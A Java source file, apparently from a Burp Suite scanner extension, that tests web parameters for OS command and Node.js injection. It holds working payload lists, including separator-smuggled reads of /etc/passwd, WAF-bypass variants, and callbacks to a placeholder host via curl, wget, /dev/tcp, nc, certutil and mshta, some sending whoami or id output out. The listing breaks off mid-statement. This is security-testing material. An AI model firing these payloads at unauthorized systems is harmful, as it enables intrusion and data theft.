package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.collaborator.InteractionType;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.framework.PayloadEncoder;
import com.omnistrike.framework.ResponseGuard;
import com.omnistrike.framework.TimingLock;

import com.omnistrike.model.*;

import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Pattern;

/**
 * MODULE 10: OS Command Injection Scanner
 * Detects command injection via time-based payloads (sleep/ping delays),
 * error-based output detection, and OOB via Burp Collaborator (DNS/HTTP callbacks).
 * Supports Unix and Windows command separators.
 */
public class CommandInjectionScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;
    // Parameters confirmed exploitable via OOB — skip all remaining phases for these
    private final Set<String> oobConfirmedParams = ConcurrentHashMap.newKeySet();

    private static final SecureRandom SECURE_RANDOM = new SecureRandom();

    // Command separators for both Unix and Windows
    private static final String[] UNIX_SEPARATORS = {
            ";", "|", "||", "&&", "\n", "`", "$(",
    };
    private static final String[] WINDOWS_SEPARATORS = {
            "&", "&&", "|", "||", "\n",
    };

    // Time-based payloads: each pair is [payload_template, expected_delay_seconds]
    // SLEEP_SECS is replaced with the configured delay
    private static final String[][] UNIX_TIME_PAYLOADS = {
            // sleep command
            {";sleep SLEEP_SECS;", "sleep"},
            {"|sleep SLEEP_SECS|", "sleep"},
            {"||sleep SLEEP_SECS||", "sleep"},
            {"&&sleep SLEEP_SECS&&", "sleep"},
            {"`sleep SLEEP_SECS`", "sleep"},
            {"$(sleep SLEEP_SECS)", "sleep"},
            {"\nsleep SLEEP_SECS\n", "sleep"},
            {";sleep SLEEP_SECS #", "sleep"},
            {"| sleep SLEEP_SECS #", "sleep"},
            // ping (alternative when sleep is unavailable)
            {";ping -c SLEEP_SECS 127.0.0.1;", "ping"},
            {"|ping -c SLEEP_SECS 127.0.0.1|", "ping"},
            {"$(ping -c SLEEP_SECS 127.0.0.1)", "ping"},
            // Newline (%0a) as separator
            {"%0asleep SLEEP_SECS%0a", "sleep-newline"},
            // $IFS space bypass
            {";sleep${IFS}SLEEP_SECS;", "sleep-IFS"},
            {"|sleep${IFS}SLEEP_SECS", "sleep-IFS-pipe"},
            // Environment variable concatenation
            {";sl${EMPTY}eep SLEEP_SECS;", "sleep-envconcat"},
            // Backtick nesting
            {"$(sleep `echo SLEEP_SECS`)", "sleep-backtick-nest"},
            // Tab as separator
            {";sleep\tSLEEP_SECS;", "sleep-tab"},
            // Brace expansion
            {"{sleep,SLEEP_SECS}", "sleep-brace"},
            // Double-encoded newline
            {"%250asleep SLEEP_SECS%250a", "sleep-double-newline"},
            // Concatenation bypass
            {"';sleep SLEEP_SECS;'", "sleep-quote-break"},
            {"\"| sleep SLEEP_SECS", "sleep-dquote-pipe"},
            // $() with IFS
            {"$(sleep${IFS}SLEEP_SECS)", "sleep-subshell-IFS"},
            // Here string
            {"<<<$(sleep SLEEP_SECS)", "sleep-herestring"},
            // Wildcard-based (using PATH globbing)
            {"/???/??e?p SLEEP_SECS", "sleep-glob"},
            // Python one-liner
            {";python3 -c 'import time;time.sleep(SLEEP_SECS)';", "python-sleep"},
            {";python -c 'import time;time.sleep(SLEEP_SECS)';", "python2-sleep"},
            // Perl one-liner
            {";perl -e 'sleep SLEEP_SECS';", "perl-sleep"},
            // Ruby one-liner
            {";ruby -e 'sleep SLEEP_SECS';", "ruby-sleep"},
            // PHP one-liner
            {";php -r 'sleep(SLEEP_SECS);';", "php-sleep"},
    };

    private static final String[][] WINDOWS_TIME_PAYLOADS = {
            {"& ping -n SLEEP_SECS 127.0.0.1 &", "ping"},
            {"| ping -n SLEEP_SECS 127.0.0.1 |", "ping"},
            {"&& ping -n SLEEP_SECS 127.0.0.1 &&", "ping"},
            {"|| ping -n SLEEP_SECS 127.0.0.1 ||", "ping"},
            {"& timeout /T SLEEP_SECS /NOBREAK &", "timeout"},
            {"\nping -n SLEEP_SECS 127.0.0.1\n", "ping"},
            // PowerShell
            {"& powershell Start-Sleep -Seconds SLEEP_SECS &", "powershell"},
            // waitfor command
            {"& waitfor /T SLEEP_SECS omni 2>nul &", "waitfor"},
            // PowerShell sleep variants
            {"& powershell -c \"Start-Sleep SLEEP_SECS\" &", "powershell-c"},
            {"& powershell -c \"Start-Sleep -Seconds SLEEP_SECS\" &", "powershell-enc"},
            // choice command
            {"& choice /C Y /T SLEEP_SECS /D Y >nul &", "choice"},
            // pathping delay
            {"& pathping -q 1 -p SLEEP_SECS000 127.0.0.1 &", "pathping"},
            // cmd /c chained
            {"| cmd /c ping -n SLEEP_SECS 127.0.0.1", "cmd-c-ping"},
    };

    // Error/output-based payloads — require specific command output patterns to confirm execution.
    // Generic strings like "Linux", "42", "bin", "inet" are NOT used — they appear on normal web pages.
    private static final String[][] OUTPUT_PAYLOADS_UNIX = {
            // id command — require full id output format: uid=N(user) gid=N
            {";id;", "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "id command (Unix)"},
            {"|id|", "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "id command piped (Unix)"},
            {"$(id)", "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "id via subshell (Unix)"},
            {"`id`", "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "id via backtick (Unix)"},
            // /etc/passwd — root:x:0:0: is definitive
            {";cat /etc/passwd;", "root:x:0:0:", "/etc/passwd read (Unix)"},
            {"|cat /etc/passwd", "root:x:0:0:", "/etc/passwd piped (Unix)"},
            {"$(cat /etc/passwd)", "root:x:0:0:", "/etc/passwd subshell (Unix)"},
            // uname — require kernel version pattern, not just "Linux"
            {";uname -a;", "REGEX:Linux\\s+\\S+\\s+\\d+\\.\\d+\\.\\d+", "uname (Unix)"},
            {"|uname -a", "REGEX:Linux\\s+\\S+\\s+\\d+\\.\\d+\\.\\d+", "uname piped (Unix)"},
            // Newline separator
            {"%0aid%0a", "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "id via newline (Unix)"},
            // $IFS space bypass
            {";cat${IFS}/etc/passwd;", "root:x:0:0:", "/etc/passwd via IFS (Unix)"},
            // expr math marker — unique 6-digit number to avoid matching natural page content
            {";expr 97531 + 33806;", "131337", "expr math marker (Unix)"},
            {"$(expr 97531 + 33806)", "131337", "expr math subshell (Unix)"},
            // Backtick nesting with $IFS
            {"`cat${IFS}/etc/passwd`", "root:x:0:0:", "/etc/passwd via IFS backtick (Unix)"},
            // env/printenv — require PATH with Unix directory structure followed by colon (actual PATH format)
            {";env;", "REGEX:PATH=/(?:usr|bin|sbin)[:/]", "env dump (Unix)"},
            {";printenv;", "REGEX:PATH=/(?:usr|bin|sbin)[:/]", "printenv (Unix)"},
            // ifconfig/ip — require IP address format after inet keyword with CIDR or old addr: prefix
            {";ifconfig 2>/dev/null||ip addr;", "REGEX:inet\\s+(?:addr:)?\\d+\\.\\d+\\.\\d+\\.\\d+(?:/\\d+)?", "ifconfig/ip (Unix)"},
            // pwd — require a Unix-like path on its own line (not inside HTML/error pages)
            {";pwd;", "REGEX:(?m)^/(?:home|root|var|tmp|usr|opt|srv|app|www)/\\S+$", "pwd (Unix)"},
            // ls -la — Unix permission strings (drwxr-xr-x) are unmistakable
            {";ls -la /;", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / (Unix)"},
            {"|ls -la /", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / piped (Unix)"},
            {"$(ls -la /)", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / subshell (Unix)"},
            {"`ls -la /`", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / backtick (Unix)"},
            {";ls${IFS}-la${IFS}/;", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / via IFS (Unix)"},
            {"%0als -la /%0a", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / newline (Unix)"},
            // cat /proc/version — specific kernel version string
            {";cat /proc/version;", "REGEX:Linux version \\d+\\.\\d+\\.\\d+", "/proc/version (Unix)"},
            // Curl-based output
            {"|curl -s file:///etc/passwd", "root:x:0:0:", "curl file proto (Unix)"},
    };

    private static final String[][] OUTPUT_PAYLOADS_WINDOWS = {
            // win.ini — require TWO section markers to avoid FP on pages that mention [fonts] casually
            {"& type C:\\Windows\\win.ini &", "REGEX:(?s)(?=.*\\[fonts\\]).*\\[(?:extensions|mci extensions|files)\\]", "win.ini read (Windows)"},
            {"| type C:\\Windows\\win.ini", "REGEX:(?s)(?=.*\\[fonts\\]).*\\[(?:extensions|mci extensions|files)\\]", "win.ini piped (Windows)"},
            // ver — require full version string format
            {"& ver &", "REGEX:Microsoft Windows \\[Version \\d+\\.", "ver command (Windows)"},
            // set /a math marker — unique number
            {"& set /a 97531+33806 &", "131337", "set /a math marker (Windows)"},
            // Newline separator
            // ipconfig — require IPv4 address pattern
            {"& ipconfig &", "REGEX:IPv4.*:\\s*\\d+\\.\\d+\\.\\d+\\.\\d+", "ipconfig (Windows)"},
            // systeminfo — require OS Name with Microsoft
            {"& systeminfo &", "REGEX:OS Name:\\s+Microsoft", "systeminfo (Windows)"},
            // dir — require Volume in drive pattern
            {"& dir C:\\ &", "REGEX:Volume in drive [A-Z]", "dir C: (Windows)"},
            // net user — require user accounts listing header
            {"& net user &", "REGEX:(?s)User accounts for.*?-{10,}", "net user (Windows)"},
            // tasklist — require full tasklist format: Image Name, PID, Session Name, Session#, Mem Usage
            {"& tasklist &", "REGEX:\\w+\\.exe\\s+\\d+\\s+\\w+\\s+\\d+\\s+[\\d,]+ K", "tasklist (Windows)"},
            // wmic — require Windows with version number
            {"& wmic os get caption &", "REGEX:Caption\\s*\\r?\\nMicrosoft Windows", "wmic os (Windows)"},
            // PowerShell expressions
            {"& powershell -c \"[System.Environment]::OSVersion\" &", "REGEX:(?:OSVersion|Version).*Microsoft Windows NT \\d+\\.\\d+", "powershell OSVersion (Windows)"},
    };

    // OOB payloads using Collaborator (COLLAB_PLACEHOLDER replaced at runtime)
    private static final String[][] OOB_PAYLOADS_UNIX = {
            {";nslookup COLLAB_PLACEHOLDER;", "nslookup (Unix)"},
            {"|nslookup COLLAB_PLACEHOLDER", "nslookup piped (Unix)"},
            {"$(nslookup COLLAB_PLACEHOLDER)", "nslookup subshell (Unix)"},
            {"`nslookup COLLAB_PLACEHOLDER`", "nslookup backtick (Unix)"},
            {";curl http://COLLAB_PLACEHOLDER/cmdi;", "curl (Unix)"},
            {"|curl http://COLLAB_PLACEHOLDER/cmdi", "curl piped (Unix)"},
            {"$(curl http://COLLAB_PLACEHOLDER/cmdi)", "curl subshell (Unix)"},
            {";wget http://COLLAB_PLACEHOLDER/cmdi;", "wget (Unix)"},
            {";ping -c 1 COLLAB_PLACEHOLDER;", "ping (Unix)"},
            {"|ping -c 1 COLLAB_PLACEHOLDER", "ping piped (Unix)"},
            {";host COLLAB_PLACEHOLDER;", "host lookup (Unix)"},
            {";dig COLLAB_PLACEHOLDER;", "dig lookup (Unix)"},
            // Newline separator nslookup
            {"%0anslookup COLLAB_PLACEHOLDER%0a", "nslookup newline (Unix)"},
            // $IFS variants
            {";nslookup${IFS}COLLAB_PLACEHOLDER;", "nslookup IFS (Unix)"},
            {"|curl${IFS}http://COLLAB_PLACEHOLDER/cmdi", "curl IFS piped (Unix)"},
            // Python popen
            {";python -c \"import os;os.popen('nslookup COLLAB_PLACEHOLDER')\" ;", "python popen (Unix)"},
            // curl POST with data exfil
            {";curl http://COLLAB_PLACEHOLDER/$(whoami);", "curl whoami exfil (Unix)"},
            {";wget -q http://COLLAB_PLACEHOLDER/$(id|base64) -O /dev/null;", "wget id exfil (Unix)"},
            // Perl OOB
            {";perl -e 'use IO::Socket::INET;IO::Socket::INET->new(PeerAddr=>\"COLLAB_PLACEHOLDER\",PeerPort=>80)';", "perl socket (Unix)"},
            // Python OOB
            {";python3 -c 'import socket;socket.socket().connect((\"COLLAB_PLACEHOLDER\",80))';", "python3 socket (Unix)"},
            {";python -c 'import urllib;urllib.urlopen(\"http://COLLAB_PLACEHOLDER/cmdi\")';", "python urllib (Unix)"},
            // Ruby OOB
            {";ruby -e 'require\"net/http\";Net::HTTP.get(URI(\"http://COLLAB_PLACEHOLDER/cmdi\"))';", "ruby http (Unix)"},
            // PHP OOB
            {";php -r 'file_get_contents(\"http://COLLAB_PLACEHOLDER/cmdi\");';", "php file_get (Unix)"},
            // openssl OOB
            {";openssl s_client -connect COLLAB_PLACEHOLDER:443 2>/dev/null;", "openssl connect (Unix)"},
            // bash /dev/tcp
            {";bash -c 'echo > /dev/tcp/COLLAB_PLACEHOLDER/80';", "bash dev-tcp (Unix)"},
            // nc/netcat
            {";nc -z COLLAB_PLACEHOLDER 80;", "netcat (Unix)"},
    };

    private static final String[][] OOB_PAYLOADS_WINDOWS = {
            {"& nslookup COLLAB_PLACEHOLDER &", "nslookup (Windows)"},
            {"| nslookup COLLAB_PLACEHOLDER", "nslookup piped (Windows)"},
            {"& ping -n 1 COLLAB_PLACEHOLDER &", "ping (Windows)"},
            {"| ping -n 1 COLLAB_PLACEHOLDER", "ping piped (Windows)"},
            {"& certutil -urlcache -split -f http://COLLAB_PLACEHOLDER/cmdi &", "certutil (Windows)"},
            {"& powershell Invoke-WebRequest http://COLLAB_PLACEHOLDER/cmdi &", "powershell IWR (Windows)"},
            {"& powershell (New-Object Net.WebClient).DownloadString('http://COLLAB_PLACEHOLDER/cmdi') &", "powershell WebClient (Windows)"},
            // PowerShell DNS resolution
            {"& powershell -c \"Resolve-DnsName COLLAB_PLACEHOLDER\" &", "powershell DNS (Windows)"},
            // PowerShell Net.Sockets
            {"& powershell -c \"(New-Object Net.Sockets.TcpClient).Connect('COLLAB_PLACEHOLDER',80)\" &", "powershell TCP (Windows)"},
            // bitsadmin
            {"& bitsadmin /transfer omni http://COLLAB_PLACEHOLDER/cmdi %temp%\\omni &", "bitsadmin (Windows)"},
            // mshta
            {"& mshta http://COLLAB_PLACEHOLDER/cmdi &", "mshta (Windows)"},
            // rundll32
            {"& rundll32 url.dll,FileProtocolHandler http://COLLAB_PLACEHOLDER/cmdi &", "rundll32 (Windows)"},
            // explorer
            {"& start http://COLLAB_PLACEHOLDER/cmdi &", "start URL (Windows)"},
            // wmic process call
            {"& wmic process call create \"cmd /c nslookup COLLAB_PLACEHOLDER\" &", "wmic process (Windows)"},
            // curl (modern Windows)
            {"& curl http://COLLAB_PLACEHOLDER/cmdi &", "curl (Windows)"},
    };

    // ─────────────────────────────────────────────────────────────────────────
    // Node.js Server-Side JavaScript Injection (SSJI) Payloads
    // Used ONLY for JSON body parameters (CmdiTargetType.JSON).
    //
    // Each payload breaks out of a common Node.js eval/template context, then
    // executes a shell command via require('child_process').execSync(). The
    // trailing // is a JS single-line comment that silences any remaining
    // characters from the surrounding eval string, preventing syntax errors.
    //
    // Context breakers cover the most common server-side eval idioms:
    //   '       → eval("'" + input + "'")
    //   ')      → eval(someFunc(input))
    //   '})     → eval(fn({key: input}))     ← most common real-world pattern
    //   '))     → eval(outer(inner(input)))
    //   '}}))   → eval(outer({key: inner({k: input})}))  ← seen in HTB challenges
    //
    // WAF bypass variants replace bare require() with global.process.mainModule.require()
    // to evade keyword filters that block 'require'.
    //
    // COLLAB_PLACEHOLDER / SLEEP_SECS are substituted at runtime.
    // ─────────────────────────────────────────────────────────────────────────

    private static final String[][] NODEJS_OOB_PAYLOADS = {
            // curl HTTP callback — five context breakers
            {"' + require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssji').toString()//",      "require+curl (bare-quote)"},
            {"') + require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssji').toString()//",     "require+curl (close-paren)"},
            {"'}) + require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssji').toString()//",    "require+curl (obj+paren)"},
            {"')) + require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssji').toString()//",    "require+curl (dbl-paren)"},
            {"'}})) + require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssji').toString()//",  "require+curl (dbl-obj+dbl-paren)"},
            // wget as curl alternative (some containers have wget but not curl)
            {"' + require('child_process').execSync('wget -q http://COLLAB_PLACEHOLDER/ssji').toString()//",   "require+wget (bare-quote)"},
            {"'}) + require('child_process').execSync('wget -q http://COLLAB_PLACEHOLDER/ssji').toString()//", "require+wget (obj+paren)"},
            // DNS via nslookup / ping — works even when HTTP egress is blocked
            {"' + require('child_process').execSync('nslookup COLLAB_PLACEHOLDER').toString()//",              "require+nslookup (bare-quote)"},
            {"'}) + require('child_process').execSync('nslookup COLLAB_PLACEHOLDER').toString()//",            "require+nslookup (obj+paren)"},
            {"' + require('child_process').execSync('ping -c 1 COLLAB_PLACEHOLDER').toString()//",             "require+ping (bare-quote)"},
            // WAF bypass: global.process.mainModule.require() avoids the bare 'require' keyword
            {"' + global.process.mainModule.require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssji').toString()//",    "global.process+curl (bare-quote)"},
            {"'}) + global.process.mainModule.require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssji').toString()//",  "global.process+curl (obj+paren)"},
            {"' + global.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER').toString()//",            "global.process+nslookup (bare-quote)"},
            // IIFE WAF bypass — hides 'require' behind a variable reference
            {"' + (()=>{const r=global.process.mainModule.require;return r('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssji').toString()})()//", "IIFE+global.process+curl"},
    };

    // SLEEP_SECS is replaced with the configured delay at runtime (same mechanic as UNIX_TIME_PAYLOADS)
    private static final String[][] NODEJS_TIME_PAYLOADS = {
            {"' + require('child_process').execSync('sleep SLEEP_SECS').toString()//",     "require+sleep (bare-quote)"},
            {"') + require('child_process').execSync('sleep SLEEP_SECS').toString()//",    "require+sleep (close-paren)"},
            {"'}) + require('child_process').execSync('sleep SLEEP_SECS').toString()//",   "require+sleep (obj+paren)"},
            {"')) + require('child_process').execSync('sleep SLEEP_SECS').toString()//",   "require+sleep (dbl-paren)"},
            {"'}})) + require('child_process').execSync('sleep SLEEP_SECS').toString()//", "require+sleep (dbl-obj+dbl-paren)"},
            // WAF bypass
            {"' + global.process.mainModule.require('child_process').execSync('sleep SLEEP_SECS').toString()//",   "global.process+sleep (bare-quote)"},
            {"'}) + global.process.mainModule.require('child_process').execSync('sleep SLEEP_SECS').toString()//", "global.process+sleep (obj+paren)"},
    };

    // Output-based: [payload, expectedOutput, technique] — same format as OUTPUT_PAYLOADS_UNIX
    private static final String[][] NODEJS_OUTPUT_PAYLOADS = {
            // id — uid=N(user) gid=N output is unmistakable and cannot be produced by input reflection
            {"' + require('child_process').execSync('id').toString()//",     "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "execSync id (bare-quote)"},
            {"'}) + require('child_process').execSync('id').toString()//",   "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "execSync id (obj+paren)"},
            {"')) + require('child_process').execSync('id').toString()//",   "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "execSync id (dbl-paren)"},
            {"'}})) + require('child_process').execSync('id').toString()//", "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "execSync id (dbl-obj+dbl-paren)"},
            // /etc/passwd — root:x:0:0: is definitive
            {"' + require('child_process').execSync('cat /etc/passwd').toString()//",   "root:x:0:0:", "execSync cat /etc/passwd (bare-quote)"},
            {"'}) + require('child_process').execSync('cat /etc/passwd').toString()//", "root:x:0:0:", "execSync cat /etc/passwd (obj+paren)"},
            // WAF bypass variants
            {"' + global.process.mainModule.require('child_process').execSync('id').toString()//",   "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "global.process execSync id (bare-quote)"},
            {"'}) + global.process.mainModule.require('child_process').execSync('id').toString()//", "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "global.process execSync id (obj+paren)"},
    };

    @Override
    public String getId() { return "cmdi-scanner"; }

    @Override
    public String getName() { return "Command Injection Scanner"; }

    @Override
    public String getDescription() {
        return "OS command injection via time-based delays, output detection, and OOB (Collaborator) for Unix and Windows.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlowForParameter(
            HttpRequestResponse requestResponse, String targetParameterName, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<CmdiTarget> targets = extractTargets(request);
        targets.removeIf(t -> !t.name.equalsIgnoreCase(targetParameterName));
        return runCmdiTargets(requestResponse, targets, urlPath);
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<CmdiTarget> targets = extractTargets(request);
        return runCmdiTargets(requestResponse, targets, urlPath);
    }

    private List<Finding> runCmdiTargets(HttpRequestResponse requestResponse,
                                          List<CmdiTarget> targets, String urlPath) {
        for (CmdiTarget target : targets) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return Collections.emptyList();
            if (!dedup.markIfNew("cmdi-scanner", urlPath, target.name)) continue;

            try {
                testCommandInjection(requestResponse, target);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return Collections.emptyList();
            } catch (Exception e) {
                api.logging().logToError("CmdI test error on " + target.name + ": " + e.getMessage());
            }
        }

        return Collections.emptyList();
    }

    private void testCommandInjection(HttpRequestResponse original, CmdiTarget target) throws InterruptedException {
        String url = original.request().url();
        int delaySecs = config.getInt("cmdi.delaySecs", 18);

        // Phase 1: OOB via Collaborator (FIRST — fastest path to confirmed finding)
        if (config.getBool("cmdi.oob.enabled", true)
                && collaboratorManager != null && collaboratorManager.isAvailable()) {
            testOob(original, target, url);
            // Fire SSJI OOB callbacks immediately for JSON params — do NOT wait behind Phase 5
            // time-based tests. Without this, SSJI callbacks would only fire after 30+ minutes
            // of traditional time-based probing (18s × many payloads × 3 verification steps).
            if (target.type == CmdiTargetType.JSON && config.getBool("cmdi.nodejs.enabled", true)) {
                testNodejsOob(original, target, url);
            }
        }

        // Phase 2: Baseline (multi-measurement for accuracy)
        if (oobConfirmedParams.contains(target.name)) return;
        TimedResult baselineResult = measureResponseTime(original, target, target.originalValue);
        long baselineTime = baselineResult.elapsedMs;
        HttpRequestResponse baseline = baselineResult.response;
        String baselineBody = baseline != null && baseline.response() != null
                ? baseline.response().bodyToString() : "";

        // Take 2 additional baseline measurements and use the maximum
        TimedResult b2 = measureResponseTime(original, target, target.originalValue);
        TimedResult b3 = measureResponseTime(original, target, target.originalValue);
        baselineTime = Math.max(baselineTime, Math.max(
                b2.response != null ? b2.elapsedMs : 0,
                b3.response != null ? b3.elapsedMs : 0));

        // Phase 3: Output-based detection (Unix)
        // Skip output-based for header targets — header injection causes response differences
        // (WAF blocks, routing changes, logging errors) unrelated to command execution.
        // Headers are only tested via time-based (below).
        if (oobConfirmedParams.contains(target.name)) return;
        if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
        if (target.type != CmdiTargetType.HEADER && config.getBool("cmdi.output.enabled", true)) {
            if (testOutputBased(original, target, url, baselineBody, OUTPUT_PAYLOADS_UNIX, "Unix")) return;
        }

        // Phase 4: Output-based detection (Windows)
        if (oobConfirmedParams.contains(target.name)) return;
        if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
        if (target.type != CmdiTargetType.HEADER && config.getBool("cmdi.output.enabled", true)) {
            if (testOutputBased(original, target, url, baselineBody, OUTPUT_PAYLOADS_WINDOWS, "Windows")) return;
        }

        // Phase 4b: Windows math + error detection (dynamic operands, independent probes).
        if (oobConfirmedParams.contains(target.name)) return;
        if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
        if (target.type != CmdiTargetType.HEADER && config.getBool("cmdi.output.enabled", true)) {
            if (testWindowsEchoError(original, target, url, baselineBody)) return;
        }

        // Phase 4c: Linux math + error detection (dynamic operands, independent probes).
        // Catches apps that surface stdout (expr result) or stderr (sh/bash/zsh "not found" errors).
        if (oobConfirmedParams.contains(target.name)) return;
        if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
        if (target.type != CmdiTargetType.HEADER && config.getBool("cmdi.output.enabled", true)) {
            if (testLinuxMathError(original, target, url, baselineBody)) return;
        }

        // Phase 5: Time-based blind — serialized via TimingLock; skipped when the UI toggle is off
        if (oobConfirmedParams.contains(target.name)) return;
        if (TimingLock.isEnabled()) {
            try {
                TimingLock.acquire();
                if (config.getBool("cmdi.unix.enabled", true)) {
                    if (testTimeBased(original, target, url, baselineTime, delaySecs, UNIX_TIME_PAYLOADS, "Unix")) return;
                }
                if (config.getBool("cmdi.windows.enabled", true)) {
                    if (testTimeBased(original, target, url, baselineTime, delaySecs, WINDOWS_TIME_PAYLOADS, "Windows")) return;
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } finally {
                TimingLock.release();
            }
        }

        // Phase 6: Node.js Server-Side JavaScript Injection — JSON parameters only.
        // OOB and output-based sub-phases always run; time-based sub-phase respects the
        // same TimingLock.isEnabled() gate as Phase 5.
        if (oobConfirmedParams.contains(target.name)) return;
        if (target.type == CmdiTargetType.JSON && config.getBool("cmdi.nodejs.enabled", true)) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
            testNodejsInjection(original, target, url, baselineTime, baselineBody, delaySecs);
        }
    }

    // ==================== TIME-BASED DETECTION ====================
    // Three-step verification: (1) true condition delays, (2) control/no-op returns within baseline,
    // (3) true condition delays again. This eliminates FPs from network jitter, WAF blocking, and
    // server-side load spikes. Mirrors the SQLi time-based verification approach.

    private boolean testTimeBased(HttpRequestResponse original, CmdiTarget target, String url,
                                   long baselineTime, int delaySecs, String[][] payloads, String osType)
            throws InterruptedException {

        long thresholdMs = (long)(delaySecs * 1000 * 0.8); // 80% of expected delay

        for (String[] payloadInfo : payloads) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
            String payloadTemplate = payloadInfo[0];
            String technique = payloadInfo[1];
            String truePayload = payloadTemplate.replace("SLEEP_SECS", String.valueOf(delaySecs));
            // Control payload: same injection syntax but zero delay — proves the delay is from the command
            String controlPayload = payloadTemplate.replace("SLEEP_SECS", "0");

            // Step 1: True condition — must delay beyond baseline + 80% of expected
            TimedResult result1 = measureResponseTime(original, target, target.originalValue + truePayload);
            if (!ResponseGuard.isTimingTrustworthy(result1.response)) { perHostDelay(); continue; }
            if (result1.elapsedMs < baselineTime + thresholdMs) {
                perHostDelay();
                continue;
            }
            // Discard if response is a small error page (WAF block, not execution)
            if (isSmallErrorPage(result1.response)) {
                perHostDelay();
                continue;
            }

            // Step 2: Control condition (zero delay) — must return within baseline range
            // If control also delays, the delay is from network/server load, not command execution
            TimedResult controlResult = measureResponseTime(original, target, target.originalValue + controlPayload);
            if (!ResponseGuard.isTimingTrustworthy(controlResult.response)) { perHostDelay(); continue; }
            long controlCeiling = baselineTime + Math.max((long)(baselineTime * 0.5), 1000);
            if (controlResult.elapsedMs > controlCeiling) {
                // Control also slow — network jitter or WAF latency, not command injection
                perHostDelay();
                continue;
            }

            // Step 3: True condition again — must delay again to confirm repeatability
            TimedResult result2 = measureResponseTime(original, target, target.originalValue + truePayload);
            if (!ResponseGuard.isTimingTrustworthy(result2.response)) { perHostDelay(); continue; }
            if (result2.elapsedMs < baselineTime + thresholdMs) {
                perHostDelay();
                continue;
            }
            if (isSmallErrorPage(result2.response)) {
                perHostDelay();
                continue;
            }

            // All three steps passed — confirmed
            findingsStore.addFinding(Finding.builder("cmdi-scanner",
                            "OS Command Injection (Time-Based) - " + osType,
                            Severity.CRITICAL, Confidence.FIRM)
                    .url(url).parameter(target.name)
                    .evidence("Technique: " + technique + " (" + osType + ")"
                            + " | Payload: " + truePayload
                            + " | Baseline: " + baselineTime + "ms"
                            + " | True condition 1: " + result1.elapsedMs + "ms"
                            + " | Control (zero delay): " + controlResult.elapsedMs + "ms"
                            + " | True condition 2: " + result2.elapsedMs + "ms"
                            + " | Expected delay: " + delaySecs + "s (threshold 80%: " + thresholdMs + "ms)")
                    .description("Time-based OS command injection confirmed via 3-step verification. "
                            + "True condition delayed by ~" + delaySecs + "s, control (zero delay) returned "
                            + "within baseline range (" + controlResult.elapsedMs + "ms), second true condition "
                            + "confirmed the delay. Parameter '" + target.name + "' is injectable via "
                            + technique + " (" + osType + ").")
                    .payload(truePayload)
                    .requestResponse(result2.response)
